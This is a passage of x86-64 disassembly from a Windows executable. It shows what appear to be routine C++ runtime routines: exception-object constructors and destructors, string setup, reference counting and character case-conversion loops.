   140001686:	48 83 ec 20          	sub    $0x20,%rsp
   14000168a:	48 8d 05 af ef 02 00 	lea    0x2efaf(%rip),%rax        # 0x140030640
   140001691:	48 8b f9             	mov    %rcx,%rdi
   140001694:	48 89 01             	mov    %rax,(%rcx)
   140001697:	8b da                	mov    %edx,%ebx
   140001699:	48 83 c1 08          	add    $0x8,%rcx
   14000169d:	e8 b6 a3 00 00       	call   0x14000ba58
   1400016a2:	f6 c3 01             	test   $0x1,%bl
   1400016a5:	74 0d                	je     0x1400016b4
   1400016a7:	ba 28 00 00 00       	mov    $0x28,%edx
   1400016ac:	48 8b cf             	mov    %rdi,%rcx
   1400016af:	e8 ac 87 00 00       	call   0x140009e60
   1400016b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400016b9:	48 8b c7             	mov    %rdi,%rax
   1400016bc:	48 83 c4 20          	add    $0x20,%rsp
   1400016c0:	5f                   	pop    %rdi
   1400016c1:	c3                   	ret
   1400016c2:	cc                   	int3
   1400016c3:	cc                   	int3
   1400016c4:	cc                   	int3
   1400016c5:	cc                   	int3
   1400016c6:	cc                   	int3
   1400016c7:	cc                   	int3
   1400016c8:	cc                   	int3
   1400016c9:	cc                   	int3
   1400016ca:	cc                   	int3
   1400016cb:	cc                   	int3
   1400016cc:	cc                   	int3
   1400016cd:	cc                   	int3
   1400016ce:	cc                   	int3
   1400016cf:	cc                   	int3
   1400016d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400016d5:	57                   	push   %rdi
   1400016d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400016da:	48 8b da             	mov    %rdx,%rbx
   1400016dd:	48 8d 05 5c ef 02 00 	lea    0x2ef5c(%rip),%rax        # 0x140030640
   1400016e4:	48 89 01             	mov    %rax,(%rcx)
   1400016e7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1400016eb:	48 8b f9             	mov    %rcx,%rdi
   1400016ee:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400016f1:	0f 11 02             	movups %xmm0,(%rdx)
   1400016f4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400016f8:	e8 cb a2 00 00       	call   0x14000b9c8
   1400016fd:	48 8d 05 9c ef 02 00 	lea    0x2ef9c(%rip),%rax        # 0x1400306a0
   140001704:	48 89 07             	mov    %rax,(%rdi)
   140001707:	48 8d 05 aa ef 02 00 	lea    0x2efaa(%rip),%rax        # 0x1400306b8
   14000170e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001712:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001717:	48 89 07             	mov    %rax,(%rdi)
   14000171a:	48 8b c7             	mov    %rdi,%rax
   14000171d:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001721:	48 83 c4 20          	add    $0x20,%rsp
   140001725:	5f                   	pop    %rdi
   140001726:	c3                   	ret
   140001727:	cc                   	int3
   140001728:	cc                   	int3
   140001729:	cc                   	int3
   14000172a:	cc                   	int3
   14000172b:	cc                   	int3
   14000172c:	cc                   	int3
   14000172d:	cc                   	int3
   14000172e:	cc                   	int3
   14000172f:	cc                   	int3
   140001730:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001735:	57                   	push   %rdi
   140001736:	48 83 ec 20          	sub    $0x20,%rsp
   14000173a:	48 8b da             	mov    %rdx,%rbx
   14000173d:	48 8d 05 fc ee 02 00 	lea    0x2eefc(%rip),%rax        # 0x140030640
   140001744:	48 89 01             	mov    %rax,(%rcx)
   140001747:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000174b:	48 8b f9             	mov    %rcx,%rdi
   14000174e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001751:	0f 11 02             	movups %xmm0,(%rdx)
   140001754:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001758:	e8 6b a2 00 00       	call   0x14000b9c8
   14000175d:	48 8d 05 3c ef 02 00 	lea    0x2ef3c(%rip),%rax        # 0x1400306a0
   140001764:	48 89 07             	mov    %rax,(%rdi)
   140001767:	48 8b c7             	mov    %rdi,%rax
   14000176a:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   14000176e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001773:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001777:	48 83 c4 20          	add    $0x20,%rsp
   14000177b:	5f                   	pop    %rdi
   14000177c:	c3                   	ret
   14000177d:	cc                   	int3
   14000177e:	cc                   	int3
   14000177f:	cc                   	int3
   140001780:	48 8d 05 99 cf 03 00 	lea    0x3cf99(%rip),%rax        # 0x14003e720
   140001787:	c3                   	ret
   140001788:	cc                   	int3
   140001789:	cc                   	int3
   14000178a:	cc                   	int3
   14000178b:	cc                   	int3
   14000178c:	cc                   	int3
   14000178d:	cc                   	int3
   14000178e:	cc                   	int3
   14000178f:	cc                   	int3
   140001790:	40 53                	rex push %rbx
   140001792:	48 83 ec 20          	sub    $0x20,%rsp
   140001796:	48 8b da             	mov    %rdx,%rbx
   140001799:	41 83 f8 01          	cmp    $0x1,%r8d
   14000179d:	75 2f                	jne    0x1400017ce
   14000179f:	33 c9                	xor    %ecx,%ecx
   1400017a1:	48 c7 42 18 0f 00 00 	movq   $0xf,0x18(%rdx)
   1400017a8:	00 
   1400017a9:	48 89 0a             	mov    %rcx,(%rdx)
   1400017ac:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
   1400017b0:	88 0a                	mov    %cl,(%rdx)
   1400017b2:	48 8d 15 3f e8 03 00 	lea    0x3e83f(%rip),%rdx        # 0x14003fff8
   1400017b9:	44 8d 41 15          	lea    0x15(%rcx),%r8d
   1400017bd:	48 8b cb             	mov    %rbx,%rcx
   1400017c0:	e8 8b 50 00 00       	call   0x140006850
   1400017c5:	48 8b c3             	mov    %rbx,%rax
   1400017c8:	48 83 c4 20          	add    $0x20,%rsp
   1400017cc:	5b                   	pop    %rbx
   1400017cd:	c3                   	ret
   1400017ce:	41 8b c8             	mov    %r8d,%ecx
   1400017d1:	e8 fe 7a 00 00       	call   0x1400092d4
   1400017d6:	33 c9                	xor    %ecx,%ecx
   1400017d8:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400017df:	00 
   1400017e0:	48 89 0b             	mov    %rcx,(%rbx)
   1400017e3:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400017ea:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   1400017ee:	88 0b                	mov    %cl,(%rbx)
   1400017f0:	49 ff c0             	inc    %r8
   1400017f3:	42 38 0c 00          	cmp    %cl,(%rax,%r8,1)
   1400017f7:	75 f7                	jne    0x1400017f0
   1400017f9:	48 8b d0             	mov    %rax,%rdx
   1400017fc:	48 8b cb             	mov    %rbx,%rcx
   1400017ff:	e8 4c 50 00 00       	call   0x140006850
   140001804:	48 8b c3             	mov    %rbx,%rax
   140001807:	48 83 c4 20          	add    $0x20,%rsp
   14000180b:	5b                   	pop    %rbx
   14000180c:	c3                   	ret
   14000180d:	cc                   	int3
   14000180e:	cc                   	int3
   14000180f:	cc                   	int3
   140001810:	40 53                	rex push %rbx
   140001812:	48 83 ec 20          	sub    $0x20,%rsp
   140001816:	48 8b d9             	mov    %rcx,%rbx
   140001819:	f6 c2 01             	test   $0x1,%dl
   14000181c:	74 0a                	je     0x140001828
   14000181e:	ba 10 00 00 00       	mov    $0x10,%edx
   140001823:	e8 38 86 00 00       	call   0x140009e60
   140001828:	48 8b c3             	mov    %rbx,%rax
   14000182b:	48 83 c4 20          	add    $0x20,%rsp
   14000182f:	5b                   	pop    %rbx
   140001830:	c3                   	ret
   140001831:	cc                   	int3
   140001832:	cc                   	int3
   140001833:	cc                   	int3
   140001834:	cc                   	int3
   140001835:	cc                   	int3
   140001836:	cc                   	int3
   140001837:	cc                   	int3
   140001838:	cc                   	int3
   140001839:	cc                   	int3
   14000183a:	cc                   	int3
   14000183b:	cc                   	int3
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	48 8d 05 e9 ce 03 00 	lea    0x3cee9(%rip),%rax        # 0x14003e730
   140001847:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000184e:	00 
   14000184f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001853:	48 8d 05 3e fe 02 00 	lea    0x2fe3e(%rip),%rax        # 0x140031698
   14000185a:	48 89 01             	mov    %rax,(%rcx)
   14000185d:	48 8b c1             	mov    %rcx,%rax
   140001860:	c3                   	ret
   140001861:	cc                   	int3
   140001862:	cc                   	int3
   140001863:	cc                   	int3
   140001864:	cc                   	int3
   140001865:	cc                   	int3
   140001866:	cc                   	int3
   140001867:	cc                   	int3
   140001868:	cc                   	int3
   140001869:	cc                   	int3
   14000186a:	cc                   	int3
   14000186b:	cc                   	int3
   14000186c:	cc                   	int3
   14000186d:	cc                   	int3
   14000186e:	cc                   	int3
   14000186f:	cc                   	int3
   140001870:	48 83 ec 48          	sub    $0x48,%rsp
   140001874:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001879:	e8 c2 ff ff ff       	call   0x140001840
   14000187e:	48 8d 15 e3 28 04 00 	lea    0x428e3(%rip),%rdx        # 0x140044168
   140001885:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000188a:	e8 7d a3 00 00       	call   0x14000bc0c
   14000188f:	cc                   	int3
   140001890:	40 53                	rex push %rbx
   140001892:	48 83 ec 20          	sub    $0x20,%rsp
   140001896:	48 8b d9             	mov    %rcx,%rbx
   140001899:	48 8b c2             	mov    %rdx,%rax
   14000189c:	48 8d 0d 9d ed 02 00 	lea    0x2ed9d(%rip),%rcx        # 0x140030640
   1400018a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400018a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400018aa:	48 89 0b             	mov    %rcx,(%rbx)
   1400018ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400018b1:	0f 11 02             	movups %xmm0,(%rdx)
   1400018b4:	e8 0f a1 00 00       	call   0x14000b9c8
   1400018b9:	48 8d 05 d8 fd 02 00 	lea    0x2fdd8(%rip),%rax        # 0x140031698
   1400018c0:	48 89 03             	mov    %rax,(%rbx)
   1400018c3:	48 8b c3             	mov    %rbx,%rax
   1400018c6:	48 83 c4 20          	add    $0x20,%rsp
   1400018ca:	5b                   	pop    %rbx
   1400018cb:	c3                   	ret
   1400018cc:	cc                   	int3
   1400018cd:	cc                   	int3
   1400018ce:	cc                   	int3
   1400018cf:	cc                   	int3
   1400018d0:	40 53                	rex push %rbx
   1400018d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400018d6:	48 8d 05 73 ee 02 00 	lea    0x2ee73(%rip),%rax        # 0x140030750
   1400018dd:	48 8b d9             	mov    %rcx,%rbx
   1400018e0:	48 89 01             	mov    %rax,(%rcx)
   1400018e3:	f6 c2 01             	test   $0x1,%dl
   1400018e6:	74 0a                	je     0x1400018f2
   1400018e8:	ba 08 00 00 00       	mov    $0x8,%edx
   1400018ed:	e8 6e 85 00 00       	call   0x140009e60
   1400018f2:	48 8b c3             	mov    %rbx,%rax
   1400018f5:	48 83 c4 20          	add    $0x20,%rsp
   1400018f9:	5b                   	pop    %rbx
   1400018fa:	c3                   	ret
   1400018fb:	cc                   	int3
   1400018fc:	cc                   	int3
   1400018fd:	cc                   	int3
   1400018fe:	cc                   	int3
   1400018ff:	cc                   	int3
   140001900:	f0 ff 41 08          	lock incl 0x8(%rcx)
   140001904:	c3                   	ret
   140001905:	cc                   	int3
   140001906:	cc                   	int3
   140001907:	cc                   	int3
   140001908:	cc                   	int3
   140001909:	cc                   	int3
   14000190a:	cc                   	int3
   14000190b:	cc                   	int3
   14000190c:	cc                   	int3
   14000190d:	cc                   	int3
   14000190e:	cc                   	int3
   14000190f:	cc                   	int3
   140001910:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   140001915:	b8 00 00 00 00       	mov    $0x0,%eax
   14000191a:	48 0f 44 c1          	cmove  %rcx,%rax
   14000191e:	c3                   	ret
   14000191f:	cc                   	int3
   140001920:	48 83 ec 28          	sub    $0x28,%rsp
   140001924:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001928:	48 85 c9             	test   %rcx,%rcx
   14000192b:	74 1d                	je     0x14000194a
   14000192d:	48 8b 01             	mov    (%rcx),%rax
   140001930:	ff 50 10             	call   *0x10(%rax)
   140001933:	48 85 c0             	test   %rax,%rax
   140001936:	74 12                	je     0x14000194a
   140001938:	4c 8b 00             	mov    (%rax),%r8
   14000193b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001940:	48 8b c8             	mov    %rax,%rcx
   140001943:	48 83 c4 28          	add    $0x28,%rsp
   140001947:	49 ff 20             	rex.WB jmp *(%r8)
   14000194a:	48 83 c4 28          	add    $0x28,%rsp
   14000194e:	c3                   	ret
   14000194f:	cc                   	int3
   140001950:	b8 01 00 00 00       	mov    $0x1,%eax
   140001955:	c3                   	ret
   140001956:	cc                   	int3
   140001957:	cc                   	int3
   140001958:	cc                   	int3
   140001959:	cc                   	int3
   14000195a:	cc                   	int3
   14000195b:	cc                   	int3
   14000195c:	cc                   	int3
   14000195d:	cc                   	int3
   14000195e:	cc                   	int3
   14000195f:	cc                   	int3
   140001960:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001965:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000196a:	55                   	push   %rbp
   14000196b:	57                   	push   %rdi
   14000196c:	41 56                	push   %r14
   14000196e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001973:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000197a:	48 8b da             	mov    %rdx,%rbx
   14000197d:	48 8b f9             	mov    %rcx,%rdi
   140001980:	48 85 c9             	test   %rcx,%rcx
   140001983:	0f 84 39 01 00 00    	je     0x140001ac2
   140001989:	48 83 39 00          	cmpq   $0x0,(%rcx)
   14000198d:	0f 85 2f 01 00 00    	jne    0x140001ac2
   140001993:	b9 30 00 00 00       	mov    $0x30,%ecx
   140001998:	e8 cb 84 00 00       	call   0x140009e68
   14000199d:	48 8b f0             	mov    %rax,%rsi
   1400019a0:	48 89 45 67          	mov    %rax,0x67(%rbp)
   1400019a4:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400019a8:	48 85 c9             	test   %rcx,%rcx
   1400019ab:	74 0f                	je     0x1400019bc
   1400019ad:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   1400019b1:	48 85 db             	test   %rbx,%rbx
   1400019b4:	75 0d                	jne    0x1400019c3
   1400019b6:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   1400019ba:	eb 07                	jmp    0x1400019c3
   1400019bc:	48 8d 1d 58 cd 03 00 	lea    0x3cd58(%rip),%rbx        # 0x14003e71b
   1400019c3:	33 d2                	xor    %edx,%edx
   1400019c5:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   1400019c9:	e8 86 6d 00 00       	call   0x140008754
   1400019ce:	90                   	nop
   1400019cf:	45 33 f6             	xor    %r14d,%r14d
   1400019d2:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   1400019d6:	44 88 75 c7          	mov    %r14b,-0x39(%rbp)
   1400019da:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   1400019de:	44 88 75 d7          	mov    %r14b,-0x29(%rbp)
   1400019e2:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   1400019e6:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   1400019eb:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   1400019ef:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   1400019f4:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   1400019f8:	44 88 75 07          	mov    %r14b,0x7(%rbp)
   1400019fc:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001a00:	44 88 75 17          	mov    %r14b,0x17(%rbp)
   140001a04:	48 85 db             	test   %rbx,%rbx
   140001a07:	0f 84 d2 00 00 00    	je     0x140001adf
   140001a0d:	48 8b d3             	mov    %rbx,%rdx
   140001a10:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001a14:	e8 2f 74 00 00       	call   0x140008e48
   140001a19:	90                   	nop
   140001a1a:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   140001a1e:	48 8d 05 8b fc 02 00 	lea    0x2fc8b(%rip),%rax        # 0x1400316b0
   140001a25:	48 89 06             	mov    %rax,(%rsi)
   140001a28:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   140001a2c:	e8 cb 78 00 00       	call   0x1400092fc
   140001a31:	0f 10 00             	movups (%rax),%xmm0
   140001a34:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   140001a38:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140001a3c:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   140001a40:	48 89 37             	mov    %rsi,(%rdi)
   140001a43:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001a47:	e8 68 74 00 00       	call   0x140008eb4
   140001a4c:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140001a50:	48 85 c9             	test   %rcx,%rcx
   140001a53:	74 05                	je     0x140001a5a
   140001a55:	e8 ae 27 01 00       	call   0x140014208
   140001a5a:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001a5e:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   140001a62:	48 85 c9             	test   %rcx,%rcx
   140001a65:	74 05                	je     0x140001a6c
   140001a67:	e8 9c 27 01 00       	call   0x140014208
   140001a6c:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140001a70:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001a74:	48 85 c9             	test   %rcx,%rcx
   140001a77:	74 05                	je     0x140001a7e
   140001a79:	e8 8a 27 01 00       	call   0x140014208
   140001a7e:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140001a82:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   140001a86:	48 85 c9             	test   %rcx,%rcx
   140001a89:	74 05                	je     0x140001a90
   140001a8b:	e8 78 27 01 00       	call   0x140014208
   140001a90:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140001a94:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   140001a98:	48 85 c9             	test   %rcx,%rcx
   140001a9b:	74 05                	je     0x140001aa2
   140001a9d:	e8 66 27 01 00       	call   0x140014208
   140001aa2:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140001aa6:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   140001aaa:	48 85 c9             	test   %rcx,%rcx
   140001aad:	74 05                	je     0x140001ab4
   140001aaf:	e8 54 27 01 00       	call   0x140014208
   140001ab4:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140001ab8:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001abc:	e8 0b 6d 00 00       	call   0x1400087cc
   140001ac1:	90                   	nop
   140001ac2:	b8 02 00 00 00       	mov    $0x2,%eax
   140001ac7:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140001ace:	00 
   140001acf:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001ad3:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001ad7:	49 8b e3             	mov    %r11,%rsp
   140001ada:	41 5e                	pop    %r14
   140001adc:	5f                   	pop    %rdi
   140001add:	5d                   	pop    %rbp
   140001ade:	c3                   	ret
   140001adf:	48 8d 0d 5a cc 03 00 	lea    0x3cc5a(%rip),%rcx        # 0x14003e740
   140001ae6:	e8 29 70 00 00       	call   0x140008b14
   140001aeb:	cc                   	int3
   140001aec:	cc                   	int3
   140001aed:	cc                   	int3
   140001aee:	cc                   	int3
   140001aef:	cc                   	int3
   140001af0:	0f b6 c2             	movzbl %dl,%eax
   140001af3:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001af7:	8b c8                	mov    %eax,%ecx
   140001af9:	e9 be 78 00 00       	jmp    0x1400093bc
   140001afe:	cc                   	int3
   140001aff:	cc                   	int3
   140001b00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001b05:	57                   	push   %rdi
   140001b06:	48 83 ec 20          	sub    $0x20,%rsp
   140001b0a:	49 8b f8             	mov    %r8,%rdi
   140001b0d:	48 8b da             	mov    %rdx,%rbx
   140001b10:	49 3b d0             	cmp    %r8,%rdx
   140001b13:	74 25                	je     0x140001b3a
   140001b15:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001b1a:	48 8d 71 10          	lea    0x10(%rcx),%rsi
   140001b1e:	66 90                	xchg   %ax,%ax
   140001b20:	0f b6 0b             	movzbl (%rbx),%ecx
   140001b23:	48 8b d6             	mov    %rsi,%rdx
   140001b26:	e8 91 78 00 00       	call   0x1400093bc
   140001b2b:	88 03                	mov    %al,(%rbx)
   140001b2d:	48 ff c3             	inc    %rbx
   140001b30:	48 3b df             	cmp    %rdi,%rbx
   140001b33:	75 eb                	jne    0x140001b20
   140001b35:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140001b3a:	48 8b c3             	mov    %rbx,%rax
   140001b3d:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001b42:	48 83 c4 20          	add    $0x20,%rsp
   140001b46:	5f                   	pop    %rdi
   140001b47:	c3                   	ret
   140001b48:	cc                   	int3
   140001b49:	cc                   	int3
   140001b4a:	cc                   	int3
   140001b4b:	cc                   	int3
   140001b4c:	cc                   	int3
   140001b4d:	cc                   	int3
   140001b4e:	cc                   	int3
   140001b4f:	cc                   	int3
   140001b50:	0f b6 c2             	movzbl %dl,%eax
   140001b53:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001b57:	8b c8                	mov    %eax,%ecx
   140001b59:	e9 42 7a 00 00       	jmp    0x1400095a0
   140001b5e:	cc                   	int3
   140001b5f:	cc                   	int3
   140001b60:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001b65:	57                   	push   %rdi
   140001b66:	48 83 ec 20          	sub    $0x20,%rsp
   140001b6a:	49 8b f8             	mov    %r8,%rdi
   140001b6d:	48 8b da             	mov    %rdx,%rbx
   140001b70:	49 3b d0             	cmp    %r8,%rdx
   140001b73:	74 25                	je     0x140001b9a
   140001b75:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001b7a:	48 8d 71 10          	lea    0x10(%rcx),%rsi
   140001b7e:	66 90                	xchg   %ax,%ax
   140001b80:	0f b6 0b             	movzbl (%rbx),%ecx
   140001b83:	48 8b d6             	mov    %rsi,%rdx
   140001b86:	e8 15 7a 00 00       	call   0x1400095a0
   140001b8b:	88 03                	mov    %al,(%rbx)
   140001b8d:	48 ff c3             	inc    %rbx
   140001b90:	48 3b df             	cmp    %rdi,%rbx
   140001b93:	75 eb                	jne    0x140001b80
   140001b95:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140001b9a:	48 8b c3             	mov    %rbx,%rax
   140001b9d:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001ba2:	48 83 c4 20          	add    $0x20,%rsp
   140001ba6:	5f                   	pop    %rdi
   140001ba7:	c3                   	ret
   140001ba8:	cc                   	int3
   140001ba9:	cc                   	int3
   140001baa:	cc                   	int3
   140001bab:	cc                   	int3
   140001bac:	cc                   	int3
   140001bad:	cc                   	int3
   140001bae:	cc                   	int3
   140001baf:	cc                   	int3
   140001bb0:	0f b6 c2             	movzbl %dl,%eax
   140001bb3:	c3                   	ret
   140001bb4:	cc                   	int3
   140001bb5:	cc                   	int3
   140001bb6:	cc                   	int3
   140001bb7:	cc                   	int3
   140001bb8:	cc                   	int3
   140001bb9:	cc                   	int3
   140001bba:	cc                   	int3
   140001bbb:	cc                   	int3
   140001bbc:	cc                   	int3
   140001bbd:	cc                   	int3
   140001bbe:	cc                   	int3
   140001bbf:	cc                   	int3
   140001bc0:	40 53                	rex push %rbx
   140001bc2:	48 83 ec 20          	sub    $0x20,%rsp
   140001bc6:	49 8b d8             	mov    %r8,%rbx
   140001bc9:	49 8b c9             	mov    %r9,%rcx
   140001bcc:	4c 2b c2             	sub    %rdx,%r8
   140001bcf:	e8 0c a1 00 00       	call   0x14000bce0
   140001bd4:	48 8b c3             	mov    %rbx,%rax
   140001bd7:	48 83 c4 20          	add    $0x20,%rsp
   140001bdb:	5b                   	pop    %rbx
   140001bdc:	c3                   	ret
   140001bdd:	cc                   	int3
   140001bde:	cc                   	int3
   140001bdf:	cc                   	int3
   140001be0:	40 53                	rex push %rbx
   140001be2:	48 83 ec 20          	sub    $0x20,%rsp
   140001be6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001beb:	49 8b d8             	mov    %r8,%rbx
   140001bee:	4c 2b c2             	sub    %rdx,%r8
   140001bf1:	e8 ea a0 00 00       	call   0x14000bce0
   140001bf6:	48 8b c3             	mov    %rbx,%rax
   140001bf9:	48 83 c4 20          	add    $0x20,%rsp
   140001bfd:	5b                   	pop    %rbx
   140001bfe:	c3                   	ret
   140001bff:	cc                   	int3
   140001c00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c05:	57                   	push   %rdi
   140001c06:	48 83 ec 20          	sub    $0x20,%rsp
   140001c0a:	48 8d 05 9f fa 02 00 	lea    0x2fa9f(%rip),%rax        # 0x1400316b0
   140001c11:	8b fa                	mov    %edx,%edi
   140001c13:	48 89 01             	mov    %rax,(%rcx)
   140001c16:	48 8b d9             	mov    %rcx,%rbx
   140001c19:	8b 41 20             	mov    0x20(%rcx),%eax
   140001c1c:	85 c0                	test   %eax,%eax
   140001c1e:	7e 0b                	jle    0x140001c2b
   140001c20:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001c24:	e8 df 25 01 00       	call   0x140014208
   140001c29:	eb 0b                	jmp    0x140001c36
   140001c2b:	79 09                	jns    0x140001c36
   140001c2d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001c31:	e8 2a 82 00 00       	call   0x140009e60
   140001c36:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140001c3a:	e8 c9 25 01 00       	call   0x140014208
   140001c3f:	48 8d 05 0a eb 02 00 	lea    0x2eb0a(%rip),%rax        # 0x140030750
   140001c46:	48 89 03             	mov    %rax,(%rbx)
   140001c49:	40 f6 c7 01          	test   $0x1,%dil
   140001c4d:	74 0d                	je     0x140001c5c
   140001c4f:	ba 30 00 00 00       	mov    $0x30,%edx
   140001c54:	48 8b cb             	mov    %rbx,%rcx
   140001c57:	e8 04 82 00 00       	call   0x140009e60
   140001c5c:	48 8b c3             	mov    %rbx,%rax
   140001c5f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001c64:	48 83 c4 20          	add    $0x20,%rsp
   140001c68:	5f                   	pop    %rdi
   140001c69:	c3                   	ret
   140001c6a:	cc                   	int3
   140001c6b:	cc                   	int3
   140001c6c:	cc                   	int3
   140001c6d:	cc                   	int3
   140001c6e:	cc                   	int3
   140001c6f:	cc                   	int3
   140001c70:	40 53                	rex push %rbx
   140001c72:	48 83 ec 60          	sub    $0x60,%rsp
   140001c76:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   140001c7b:	48 8b d9             	mov    %rcx,%rbx
   140001c7e:	41 0f 10 30          	movups (%r8),%xmm6
   140001c82:	33 c0                	xor    %eax,%eax
   140001c84:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001c89:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001c8e:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   140001c95:	00 00 
   140001c97:	88 44 24 30          	mov    %al,0x30(%rsp)
   140001c9b:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140001ca2:	49 ff c0             	inc    %r8
   140001ca5:	42 38 04 02          	cmp    %al,(%rdx,%r8,1)
   140001ca9:	75 f7                	jne    0x140001ca2
   140001cab:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001cb0:	e8 9b 4b 00 00       	call   0x140006850
   140001cb5:	90                   	nop
   140001cb6:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   140001cbc:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001cc1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001cc6:	48 8b cb             	mov    %rbx,%rcx
   140001cc9:	e8 62 f7 ff ff       	call   0x140001430
   140001cce:	90                   	nop
   140001ccf:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140001cd4:	48 83 fa 10          	cmp    $0x10,%rdx
   140001cd8:	72 2e                	jb     0x140001d08
   140001cda:	48 ff c2             	inc    %rdx
   140001cdd:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001ce2:	48 8b c1             	mov    %rcx,%rax
   140001ce5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001cec:	72 15                	jb     0x140001d03
   140001cee:	48 83 c2 27          	add    $0x27,%rdx
   140001cf2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001cf6:	48 2b c1             	sub    %rcx,%rax
   140001cf9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001cfd:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001d01:	77 1d                	ja     0x140001d20
   140001d03:	e8 58 81 00 00       	call   0x140009e60
   140001d08:	48 8d 05 19 e3 03 00 	lea    0x3e319(%rip),%rax        # 0x140040028
